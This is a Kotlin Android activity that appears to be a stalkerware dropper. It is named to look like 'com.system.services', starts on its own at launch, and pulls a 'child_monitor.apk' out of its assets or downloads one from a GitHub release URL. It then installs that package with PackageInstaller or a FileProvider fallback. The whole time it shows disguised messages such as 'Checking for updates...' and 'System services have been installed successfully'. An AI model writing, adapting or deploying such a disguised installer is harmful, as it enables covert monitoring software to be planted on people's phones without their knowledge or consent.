package com.system.services

import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    companion object {
        private const val BUNDLED_APK_NAME = "child_monitor.apk"
        private const val FALLBACK_URL =
            "https://github.com/godofthunder7890-crypto/ChildMonitor/releases/download/latest-build/ChildMonitor.apk"
        private const val INSTALL_ACTION = "com.system.services.INSTALL_DONE"
    }

    private lateinit var tvStatus: TextView
    private lateinit var tvSub: TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var btnAction: Button

    private val installReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            val status = intent?.getIntExtra(PackageInstaller.EXTRA_STATUS, -1)
            when (status) {
                PackageInstaller.STATUS_SUCCESS -> showDone()
                PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                    val confirmIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                    confirmIntent?.let { startActivity(it) }
                }
                else -> {
                    tvStatus.text = "Retrying..."
                    installWithFileProvider()
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvStatus   = findViewById(R.id.tvStatus)
        tvSub      = findViewById(R.id.tvSub)
        progressBar = findViewById(R.id.progressBar)
        btnAction  = findViewById(R.id.btnAction)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            registerReceiver(
                installReceiver,
                IntentFilter(INSTALL_ACTION),
                RECEIVER_NOT_EXPORTED
            )
        } else {
            registerReceiver(installReceiver, IntentFilter(INSTALL_ACTION))
        }

        btnAction.setOnClickListener { startInstall() }
        startInstall()
    }

    private fun startInstall() {
        btnAction.isEnabled = false
        btnAction.visibility = View.GONE
        progressBar.visibility = View.VISIBLE
        progressBar.isIndeterminate = true
        tvStatus.text = "Preparing..."
        tvSub.text = "Please wait"

        Thread {
            // Try bundled APK from assets first (works offline, Android 16+ safe)
            val bundledInstalled = tryInstallFromAssets()
            if (!bundledInstalled) {
                // Fallback: download from internet
                runOnUiThread { startDownload() }
            }
        }.start()
    }

    /**
     * Extracts child_monitor.apk from assets and installs it.
     * Returns true if asset was found and install was triggered.
     */
    private fun tryInstallFromAssets(): Boolean {
        return try {
            val assetFiles = assets.list("") ?: emptyArray()
            if (BUNDLED_APK_NAME !in assetFiles) return false

            runOnUiThread {
                tvStatus.text = "Extracting package..."
                tvSub.text = "Please wait"
            }

            val apkFile = File(cacheDir, "update.apk")
            assets.open(BUNDLED_APK_NAME).use { input ->
                FileOutputStream(apkFile).use { output ->
                    val buf = ByteArray(8192)
                    var read: Int
                    while (input.read(buf).also { read = it } != -1) {
                        output.write(buf, 0, read)
                    }
                }
            }

            runOnUiThread {
                tvStatus.text = "Installing..."
                tvSub.text = "This may take a moment"
                progressBar.isIndeterminate = true
                installApk(apkFile)
            }
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun startDownload() {
        tvStatus.text = "Checking for updates..."
        tvSub.text = "Please wait"

        Thread {
            try {
                val apkFile = File(cacheDir, "update.apk")
                val conn = URL(FALLBACK_URL).openConnection() as HttpURLConnection
                conn.connectTimeout = 15000
                conn.readTimeout = 60000
                conn.instanceFollowRedirects = true
                conn.connect()

                val total = conn.contentLength
                val input = conn.inputStream
                val output = FileOutputStream(apkFile)

                val buf = ByteArray(8192)
                var downloaded = 0
                var read: Int
                while (input.read(buf).also { read = it } != -1) {
                    output.write(buf, 0, read)
                    downloaded += read
                    if (total > 0) {
                        val pct = (downloaded * 100 / total)
                        runOnUiThread {
                            progressBar.isIndeterminate = false
                            progressBar.progress = pct
                            tvStatus.text = "Downloading update..."
                            tvSub.text = "$pct% complete"
                        }
                    }
                }
                output.close()
                input.close()

                runOnUiThread {
                    tvStatus.text = "Installing..."
                    tvSub.text = "This may take a moment"
                    progressBar.isIndeterminate = true
                    installApk(apkFile)
                }
            } catch (e: Exception) {
                runOnUiThread { showError(e.message ?: "Network error") }
            }
        }.start()
    }

    private fun installApk(apkFile: File) {
        if (!packageManager.canRequestPackageInstalls()) {
            startActivity(
                Intent(
                    Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:$packageName")
                )
            )
            installWithFileProvider()
            return
        }

        try {
            val installer = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            )
            val sessionId = installer.createSession(params)
            val session = installer.openSession(sessionId)

            session.openWrite("package", 0, apkFile.length()).use { out ->
                apkFile.inputStream().use { it.copyTo(out) }
                session.fsync(out)
            }

            val pi = PendingIntent.getBroadcast(
                this, sessionId,
                Intent(INSTALL_ACTION),
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )
            session.commit(pi.intentSender)
            session.close()
        } catch (e: Exception) {
            installWithFileProvider()
        }
    }

    private fun installWithFileProvider() {
        try {
            val apkFile = File(cacheDir, "update.apk")
            val uri = FileProvider.getUriForFile(
                this, "$packageName.fileprovider", apkFile
            )
            val install = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            }
            startActivity(install)
        } catch (e: Exception) {
            showError("Install failed: ${e.message}")
        }
    }

    private fun showDone() {
        progressBar.visibility = View.GONE
        tvStatus.text = "Setup complete"
        tvSub.text = "System services have been installed successfully"
        btnAction.text = "Open App"
        btnAction.visibility = View.VISIBLE
        btnAction.isEnabled = true
        btnAction.setOnClickListener {
            packageManager.getLaunchIntentForPackage("com.system.service")
                ?.let { startActivity(it) }
            finish()
        }
    }

    private fun showError(msg: String) {
        progressBar.visibility = View.GONE
        tvStatus.text = "Setup failed"
        tvSub.text = msg
        btnAction.text = "Retry"
        btnAction.visibility = View.VISIBLE
        btnAction.isEnabled = true
        btnAction.setOnClickListener { startInstall() }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(installReceiver) } catch (_: Exception) {}
    }
}
